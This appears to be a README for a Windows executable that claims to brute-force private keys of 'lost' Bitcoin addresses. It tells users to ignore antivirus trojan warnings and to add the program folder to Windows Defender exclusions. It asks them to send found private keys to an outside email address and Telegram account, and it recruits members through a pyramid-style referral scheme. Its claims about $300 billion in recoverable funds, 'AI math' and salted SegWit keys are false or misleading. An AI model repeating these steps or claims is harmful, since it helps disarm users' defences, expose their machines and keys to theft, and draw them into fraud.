Welcome, Stalker!

There are about 37,000 Bitcoin addresses in the network with abandoned, forgotten, or lost passwords and keys—addresses that have had no outgoing transactions for 
over 10 years. Additionally, there are challenge addresses set up by billionaire whales, such as the 1000 BTC Bitcoin Puzzle. 
All these addresses are baked into the CUDA_LBU_v1.0.exe tool and collectively hold around $300 billion.

If you want to join the hunt and recover these treasures, unzip the archive into your Windows user folder (typically `C:\Users\YourName\`).

1. Open the `CUDA_LBU_v1.0` folder and locate `CUDA_LBU_v.1.0.exe` inside.
2. Ignore any antivirus or Windows Defender warnings about suspicious files or trojans—these arise because the program deals with crypto-functions and key generation.
3. Add the `CUDA_LBU_v1.0` folder to your antivirus whitelist and to Windows Defender exclusions 
(`Settings → Update & Security → Windows Security → Virus & Threat Protection → Manage Settings → Add or Remove Exclusions → Add an Exclusion → Folder → 
Choose CUDA_LBU_v1.0 folder`).

`CUDA_LBU_v1.0` works only with NVIDIA GPUs supporting CUDA 10 and above.

---

## Supported Bitcoin Address Types

Today there are five address types derived from a single private key:

1. **Legacy (uncompressed)** (pre-2013, e.g., `1EHNa6Q4Jz2uvNExL497mE43ikXhwF6kZm`)
2. **Legacy (compressed)** (post-2013, e.g., `1BgGZ9tcN4rm9KBzDn7KprQz87SZ26SAMH`)
3. **SegWit P2SH** (post-2017, e.g., `3JvL6Ymt8MVWiCNHC7oWU6nLeHNJKLZGLN`)
4. **Bech32 SegWit** (`p2wpkh` and `p2wsh`, e.g., `bc1qw508d6qejxtdg4y5r3zarvary0c5xw7kv8f3t4`)
5. **Taproot Schnorr** (e.g., `bc1pmfr3p9j00pfxjh0zmgp99y8zftmd3s5pmedqhyptwy6lm87hf5sspknck9`)

We focus on compressed and uncompressed legacy addresses, since they are vulnerable to brute-force and contain the majority of lost funds. 
Recovering keys for SegWit and Taproot addresses is nearly impossible due to additional scripts and salts used.

---

## Setting the Key Range

The program lets you specify a hex range from **START** to **END** for your search to improve your chances:

* Addresses created before 2013 are typically uncompressed; post-2013 are usually compressed (not guaranteed).
* Some challenge ranges (e.g., from the 1000 BTC Bitcoin Puzzle) are known—all compressed:

START:	400001e410b4514000 END: 7fffffffffffffffff  						include 1PWo3JeB9jrGwfHDNpdGK54CRas7fsVzXU		
START:	800000000000000000 END: ffffffffffffffffff  						include 1JTK7s9YVYywfm5XUH7RNhHJH1LshCaRFR		
START:	1000000000000000000 END: 1ffffffffffffffffff  					include 12VVRNPi4SJqUTsp6FmqDqY5sGosDtysn4		
START:	2000000000000000000 END: 3ffffffffffffffffff  					include 1FWGcVDK3JGzCC3WtkYetULPszMaK2Jksv			
START:	8000000000000000000 END: fffffffffffffffffff  					include 1DJh2eHFYQfACPmrvpyWc8MSTYKh7w9eRF		
START:	10000000000000000000 END: 1fffffffffffffffffff  					include 1Bxk4CQdqL9p22JEtDfdXMsng1XacifUtE		
START:	20000000000000000000 END: 3fffffffffffffffffff  					include 15qF6X51huDjqTmF9BJgxXdt1xcj46Jmhb		
START:	40000000000000000000 END: 7fffffffffffffffffff  					include 1ARk8HWJMn8js8tQmGUJeQHjSE7KRkn2t8		
START:	100000000000000000000 END: 1ffffffffffffffffffff  					include 15qsCm78whspNQFydGJQk5rexzxTQopnHZ		
START:	200000000000000000000 END: 3ffffffffffffffffffff  					include 13zYrYhhJxp6Ui1VV7pqa5WDhNWM45ARAC		
START:	400000000000000000000 END: 7ffffffffffffffffffff  					include 14MdEb4eFcT3MVG5sPFG4jGLuHJSnt1Dk2		
START:	800000000000000000000 END: fffffffffffffffffffff  					include 1CMq3SvFcVEcpLMuuH8PUcNiqsK1oicG2D 
START:	2000000000000000000000 END: 3fffffffffffffffffffff  					include 1K3x5L6G57Y494fDqBfrojD28UJv4s5JcK		
START:	4000000000000000000000 END: 7fffffffffffffffffffff  					include 1PxH3K1Shdjb7gSEoTX7UPDZ6SH4qGPrvq	
START:	8000000000000000000000 END: ffffffffffffffffffffff  					include 16AbnZjZZipwHMkYKBSfswGWKDmXHjEpSf		
START:	10000000000000000000000 END: 1ffffffffffffffffffffff  					include 19QciEHbGVNY4hrhfKXmcBBCrJSBZ6TaVt
START:	40000000000000000000000 END: 7ffffffffffffffffffffff  					include 1EzVHtmbN4fs4MiNk3ppEnKKhsmXYJ4s74		
START:	80000000000000000000000 END: fffffffffffffffffffffff  					include 1AE8NzzgKE7Yhz7BWtAcAAxiFMbPo82NB5		
START:	100000000000000000000000 END: 1fffffffffffffffffffffff  				include 17Q7tuG2JwFFU9rXVj3uZqRtioH3mx2Jad		
START:	200000000000000000000000 END: 3fffffffffffffffffffffff  				include 1K6xGMUbs6ZTXBnhw1pippqwK6wjBWtNpL 	
START:	800000000000000000000000 END: ffffffffffffffffffffffff  					include 15ANYzzCp5BFHcCnVFzXqyibpzgPLWaD8b
START:	1000000000000000000000000 END: 1ffffffffffffffffffffffff  				include 18ywPwj39nGjqBrQJSzZVq2izR12MDpDr8
START:	2000000000000000000000000 END: 3ffffffffffffffffffffffff  				include 1CaBVPrwUxbQYYswu32w7Mj4HR4maNoJSX
START:	4000000000000000000000000 END: 7ffffffffffffffffffffffff  				include 1JWnE6p6UN7ZJBN7TtcbNDoRcjFtuDWoNL
START:	10000000000000000000000000 END: 1fffffffffffffffffffffffff  				include 1CKCVdbDJasYmhswB6HKZHEAnNaDpK7W4n
START:	20000000000000000000000000 END: 3fffffffffffffffffffffffff  				include 1PXv28YxmYMaB8zxrKeZBW8dt2HK7RkRPX
START:	40000000000000000000000000 END: 7fffffffffffffffffffffffff  				include 1AcAmB6jmtU6AiEcXkmiNE9TNVPsj9DULf
START:	80000000000000000000000000 END: ffffffffffffffffffffffffff  				include 1EQJvpsmhazYCcKX5Au6AZmZKRnzarMVZu
START:	200000000000000000000000000 END: 3ffffffffffffffffffffffffff  				include 18KsfuHuzQaBTNLASyj15hy4LuqPUo1FNB
START:	400000000000000000000000000 END: 7ffffffffffffffffffffffffff  				include 15EJFC5ZTs9nhsdvSUeBXjLAuYq3SWaxTc
START:	800000000000000000000000000 END: fffffffffffffffffffffffffff  				include 1HB1iKUqeffnVsvQsbpC6dNi1XKbyNuqao
START:	1000000000000000000000000000 END: 1fffffffffffffffffffffffffff  				include 1GvgAXVCbA8FBjXfWiAms4ytFeJcKsoyhL
START:	4000000000000000000000000000 END: 7fffffffffffffffffffffffffff  				include 1824ZJQ7nKJ9QFTRBqn7z7dHV5EGpzUpH3
START:	8000000000000000000000000000 END: ffffffffffffffffffffffffffff  				include 18A7NA9FTsnJxWgkoFfPAFbQzuQxpRtCos
START:	10000000000000000000000000000 END: 1ffffffffffffffffffffffffffff  				include 1NeGn21dUDDeqFQ63xb2SpgUuXuBLA4WT4
START:	20000000000000000000000000000 END: 3ffffffffffffffffffffffffffff  				include 174SNxfqpdMGYy5YQcfLbSTK3MRNZEePoy
START:	80000000000000000000000000000 END: fffffffffffffffffffffffffffff  				include 1MnJ6hdhvK37VLmqcdEwqC3iFxyWH2PHUV
START:	100000000000000000000000000000 END: 1fffffffffffffffffffffffffffff  			include 1KNRfGWw7Q9Rmwsc6NT5zsdvEb9M2Wkj5Z
START:	200000000000000000000000000000 END: 3fffffffffffffffffffffffffffff  			include 1PJZPzvGX19a7twf5HyD2VvNiPdHLzm9F6
START:	400000000000000000000000000000 END: 7fffffffffffffffffffffffffffff  			include 1GuBBhf61rnvRe4K8zu8vdQB3kHzwFqSy7
START:	1000000000000000000000000000000 END: 1ffffffffffffffffffffffffffffff  			include 1GDSuiThEV64c166LUFC9uDcVdGjqkxKyh
START:	2000000000000000000000000000000 END: 3ffffffffffffffffffffffffffffff  			include 1Me3ASYt5JCTAK2XaC32RMeH34PdprrfDx
START:	4000000000000000000000000000000 END: 7ffffffffffffffffffffffffffffff  			include 1CdufMQL892A69KXgv6UNBD17ywWqYpKut
START:	8000000000000000000000000000000 END: fffffffffffffffffffffffffffffff  			include 1BkkGsX9ZM6iwL3zbqs7HWBV7SvosR6m8N 
START:	20000000000000000000000000000000 END: 3fffffffffffffffffffffffffffffff  			include 1AWCLZAjKbV1P7AHvaPNCKiB7ZWVDMxFiz
START:	40000000000000000000000000000000 END: 7fffffffffffffffffffffffffffffff  			include 1G6EFyBRU86sThN3SSt3GrHu1sA7w7nzi4
START:	80000000000000000000000000000000 END: ffffffffffffffffffffffffffffffff  			include 1MZ2L1gFrCtkkn6DnTT2e4PFUTHw9gNwaj
START:	100000000000000000000000000000000 END: 1ffffffffffffffffffffffffffffffff  		1Hz3uv3nNZzBVMXLGadCucgjiCs5W9vaGz 
START:	400000000000000000000000000000000 END: 7ffffffffffffffffffffffffffffffff  		16zRPnT8znwq42q7XeMkZUhb1bKqgRogyy
START:	800000000000000000000000000000000 END: fffffffffffffffffffffffffffffffff  		1KrU4dHE5WrW8rhWDsTRjR21r8t3dsrS3R
START:	1000000000000000000000000000000000 END: 1fffffffffffffffffffffffffffffffff  		17uDfp5r4n441xkgLFmhNoSW1KWp6xVLD
START:	2000000000000000000000000000000000 END: 3fffffffffffffffffffffffffffffffff  		13A3JrvXmvg5w9XGvyyR4JEJqiLz8ZySY3
START:	4000000000000000000000000000000000 END: 7fffffffffffffffffffffffffffffffff  		16RGFo6hjq9ym6Pj7N5H7L1NR1rVPJyw2v 
START:	8000000000000000000000000000000000 END: ffffffffffffffffffffffffffffffffff  		1UDHPdovvR985NrWSkdWQDEQ1xuRiTALq
START:	10000000000000000000000000000000000 END: 1ffffffffffffffffffffffffffffffffff  		15nf31J46iLuK1ZkTnqHo7WgN5cARFK3RA
START: 20000000000000000000000000000000000 END: 3ffffffffffffffffffffffffffffffffff  		1Ab4vzG6wEQBDNQM1B2bvUz4fqXXdFk2WT
START: 40000000000000000000000000000000000 END: 7ffffffffffffffffffffffffffffffffff  		1Fz63c775VV9fNyj25d9Xfw3YHE6sKCxbt
START: 80000000000000000000000000000000000 END: fffffffffffffffffffffffffffffffffff  		1QKBaU6WAeycb3DbKbLBkX7vJiaS8r42Xo
START: 100000000000000000000000000000000000 END: 1fffffffffffffffffffffffffffffffffff  		1CD91Vm97mLQvXhrnoMChhJx4TP9MaQkJo
START: 200000000000000000000000000000000000 END: 3fffffffffffffffffffffffffffffffffff  		15MnK2jXPqTMURX4xC3h4mAZxyCcaWWEDD
START: 400000000000000000000000000000000000 END: 7fffffffffffffffffffffffffffffffffff  		13N66gCzWWHEZBxhVxG18P8wyjEWF9Yoi1
START: 800000000000000000000000000000000000 END: ffffffffffffffffffffffffffffffffffff  		1NevxKDYuDcCh1ZMMi6ftmWwGrZKC6j7Ux
START: 1000000000000000000000000000000000000 END: 1ffffffffffffffffffffffffffffffffffff  	19GpszRNUej5yYqxXoLnbZWKew3KdVLkXg
START: 2000000000000000000000000000000000000 END: 3ffffffffffffffffffffffffffffffffffff  	1M7ipcdYHey2Y5RZM34MBbpugghmjaV89P
START: 4000000000000000000000000000000000000 END: 7ffffffffffffffffffffffffffffffffffff  	18aNhurEAJsw6BAgtANpexk5ob1aGTwSeL
START: 8000000000000000000000000000000000000 END: fffffffffffffffffffffffffffffffffffff  	1FwZXt6EpRT7Fkndzv6K4b4DFoT4trbMrV
START: 10000000000000000000000000000000000000 END: 1fffffffffffffffffffffffffffffffffffff  	1CXvTzR6qv8wJ7eprzUKeWxyGcHwDYP1i2
START: 20000000000000000000000000000000000000 END: 3fffffffffffffffffffffffffffffffffffff  	1MUJSJYtGPVGkBCTqGspnxyHahpt5Te8jy
START: 40000000000000000000000000000000000000 END: 7fffffffffffffffffffffffffffffffffffff  	13Q84TNNvgcL3HJiqQPvyBb9m4hxjS3jkV
START: 80000000000000000000000000000000000000 END: ffffffffffffffffffffffffffffffffffffff  	1LuUHyrQr8PKSvbcY1v1PiuGuqFjWpDumN
START: 100000000000000000000000000000000000000 END: 1ffffffffffffffffffffffffffffffffffffff  	18192XpzzdDi2K11QVHR7td2HcPS6Qs5vg
START: 200000000000000000000000000000000000000 END: 3ffffffffffffffffffffffffffffffffffffff  	1NgVmsCCJaKLzGyKLFJfVequnFW9ZvnMLN
START: 400000000000000000000000000000000000000 END: 7ffffffffffffffffffffffffffffffffffffff  	1AoeP37TmHdFh8uN72fu9AqgtLrUwcv2wJ
START: 800000000000000000000000000000000000000 END: fffffffffffffffffffffffffffffffffffffff  	1FTpAbQa4h8trvhQXjXnmNhqdiGBd1oraE
START: 1000000000000000000000000000000000000000 END: 1fffffffffffffffffffffffffffffffffffffff  	14JHoRAdmJg3XR4RjMDh6Wed6ft6hzbQe9
START: 2000000000000000000000000000000000000000 END: 3fffffffffffffffffffffffffffffffffffffff  	19z6waranEf8CcP8FqNgdwUe1QRxvUNKBG
START: 4000000000000000000000000000000000000000 END: 7fffffffffffffffffffffffffffffffffffffff  	14u4nA5sugaswb6SZgn5av2vuChdMnD9E5
START: 8000000000000000000000000000000000000000 END: ffffffffffffffffffffffffffffffffffffffff  	1NBC8uXJy1GiJ6drkiZa1WuKn51ps7EPTv

You can choose any single range or multiple in sequence (e.g., `400001e410b4514000` to `1fffffffffffffffffff` covers six addresses).

All other addresses lie in the overall range from START: ffffffffffffffffffffffffffffffffffffffff to 
END: fffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141 and include both compressed and uncompressed.

---

## How to Run

Double-click `CUDA_LBU_v.1.0.exe`. In the console window, enter:

1. **START key (hex)**: start of your search range (e.g., `400001e410b4514000`).
2. **END key (hex)**: end of your search range (e.g., `7fffffffffffffffff`).
3. **Number of CUDA devices**: physical NVIDIA GPUs with CUDA support.
4. **CUDA blocks \[50–250]**: blocks per device tune for best SPEED (tune for your GPU; RTX 4060 \~96).
5. **Threads per block \[32–512] (multiple of 32)**: tune for best SPEED (RTX 4060 \~128).
6. **Points per thread \[50–2000]**: more points = higher SPEED, less free memory.

After launch, you’ll see initialization and live performance stats, e.g.:

```
Controlling devices...
Device 0 is not running. Generating new key range...
Generated for device 0: A = 471225FC36687073F1
Generated for device 0: B = 471225FC4020D13CB5
Started device 0 with keyspace 471225FC36687073F1:471225FC4020D13CB5
[DEVICE 3] [0000000000000000000000000000000000000000000000467C54DFE53B9C625C (71 bit)] [SPEED: 839.76 MKey/s] [00:00:58]
[DEVICE 5] [000000000000000000000000000000000000000000000046B7CEF276208B8CE4 (71 bit)] [SPEED: 719.96 MKey/s] [00:00:45]
[DEVICE 4] [000000000000000000000000000000000000000000000047A85878BB843B6BAF (71 bit)] [SPEED: 730.64 MKey/s] [00:00:07]
[DEVICE 6] [000000000000000000000000000000000000000000000045DD4E3D365FF75233 (71 bit)] [SPEED: 440.34 MKey/s] [00:03:52]
[DEVICE 2] [0000000000000000000000000000000000000000000000464D7F9D7260DE497A (71 bit)] [SPEED: 854.46 MKey/s] [00:00:43]
[DEVICE 1] [0000000000000000000000000000000000000000000000463EA63358FC49022D (71 bit)] [SPEED: 859.21 MKey/s] [00:00:47]
[DEVICE 3] [0000000000000000000000000000000000000000000000467C54DFE5965BA25C (71 bit)] [SPEED: 840.22 MKey/s] [00:00:59]
```

To test, use a micro-range for address `13zb1hQbWVsc2S7ZTZnP2G4undNNpdh5so:`
`START: 2832ed74f2b5e25ee END: 2832ed74f3b5e45ee`

The program uses AI math optimization methods, deterministic cyclic ranges mode and full-random brute-force when `RANDOM` is specified in START: and END:. 
The longer it runs, the higher your chance to find a key. When a key is found, it prints the address and stops all processes, saving results to `Found_Keys.txt`.

**Take a screenshot or photo of the console** at that moment.  Send `Found_Keys.txt` from the program folder via email or messenger to:

* `SoGerera@yahoo.com`
* [https://t.me/RomanVader](https://t.me/RomanVader)

Include your Bitcoin address to receive 50% of the recovered funds.

---

## Referral & Rewards Network

The process of finding the code depends on luck and the computing power of your video cards, as well as YOUR NETWORK OF BOLTS.
You can increase the chance of finding codes if you expand your network of bolts, recommending the program to your friends and on the Internet.
Take the email (telegram, whatsapp) of your invitee and save it in your table (for example, Google Docs).
Once a week, send a link to the table of your network (if there are any changes) to your stalker - who invited you to the project.
To the email / messenger of the invitee, send the same information and the same files that you received from your stalker.
To receive / send files via telegram - install Telegram Desktop on your Windows computer (https://desktop.telegram.org/)

Telegram group: https://t.me/LostBTCUnlocker

## Important!

Your GPUs run at full load—provide proper cooling (floor fans, open case), especially in hot weather.

Minimum requirements:

* Windows 10
* Intel Celeron 1 GHz
* 4 GB RAM
* NVIDIA CUDA GPU
* No internet required

**Referral structure:**

* **Stalker**: anyone in the Telegram group ([https://t.me/LostBTCUnlocker](https://t.me/LostBTCUnlocker)).
* **Bolt**: a Stalker you invited.


* Each found key awards:

  * 50% to the finder
  * 7% to their inviter (Stalker)
  * 10% split equally among all active group members who posted a weekly photo/video proof of running the program (Fri–Mon, showing timestamp)

For example, if 1,000 BTC is found:

* Finder: 500 BTC
* Their Stalker: 70 BTC
* 997 active members: 0.1 BTC each (\~\$10,000)

**Weekly proof requirement:**
Post here https://t.me/LostBTCUnlocker a screenshot or video of the program’s console with a visible timestamp like `[2025-07-12T17:49:00] hour#220`.

When a code is found, submit it with your BTC address and your inviter’s contact to the project lead (“Monolith”) https://t.me/RomanVader.

All rewards are paid manually.

---

Good luck, Stalker. Patience and persistence will pay off!
